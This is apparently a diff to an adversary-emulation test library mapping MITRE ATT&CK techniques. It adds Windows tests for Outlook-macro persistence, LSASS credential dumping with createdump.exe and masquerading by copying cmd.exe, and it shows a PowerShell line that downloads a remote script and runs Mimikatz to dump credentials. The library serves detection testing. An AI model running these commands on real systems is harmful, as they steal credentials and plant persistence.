@@ -12291,13 +12291,14 @@ persistence:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -12306,10 +12307,10 @@ persistence:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
@@ -13939,7 +13940,27 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137
+    atomic_tests:
+    - name: Office Application Startup - Outlook as a C2
+      auto_generated_guid: bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c
+      description: "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
+        \nit is possible to use Outlook Macro as a way to achieve persistance and
+        execute arbitrary commands. This transform Outlook into a C2.\nToo achieve
+        this two things must happened on the syste\n- The macro security registry
+        value must be set to '4'\n- A file called VbaProject.OTM must be created in
+        the Outlook Folder.\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
+          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        cleanup_command: |
+          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
+          del %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        name: command_prompt
   T1137.001:
     technique:
       external_references:
@@ -20787,6 +20808,46 @@ credential-access:
       executor:
         command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
           Invoke-Mimikatz -DumpCreds
+
+'
+        name: powershell
+        elevation_required: true
+    - name: Dump LSASS with .Net 5 createdump.exe
+      auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
+      description: "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20)
+        from @bopin2020 in order to dump lsass\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\dotnet-lsass.dmp
+        createdump_exe:
+          description: Path of createdump.exe executable
+          type: Path
+          default: C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.3\createdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must have createdump.exe from .Net 5
+
+'
+        prereq_command: 'if (Test-Path ''#{createdump_exe}'') {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'echo ".NET 5 must be installed manually." "For the very
+          brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
+
+'
+      executor:
+        command: |
+          echo "Createdump Path #{createdump_exe}"
+          $LSASS = tasklist | findstr "lsass"
+          $FIELDS = $LSASS -split "\s+"
+          $ID = $FIELDS[1]
+          & "#{createdump_exe}" -u -f #{output_file} $ID
+        cleanup_command: 'del #{output_file}
 
 '
         name: powershell
@@ -34193,7 +34254,20 @@ defense-evasion:
       - Bartosz Jerzman
       x_mitre_version: '1.3'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1036
+    atomic_tests:
+    - name: System File Copied to Unusual Location
+      auto_generated_guid: 51005ac7-52e2-45e0-bdab-d17c6d4916cd
+      description: It may be suspicious seeing a file copy of an EXE in System32 or
+        SysWOW64 to a non-system directory or executing from a non-system directory.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe
+          start %ALLUSERSPROFILE%\cmd.exe
+        cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
+        name: command_prompt
   T1036.005:
     technique:
       external_references:
@@ -62375,13 +62449,14 @@ initial-access:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -62390,10 +62465,10 @@ initial-access:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
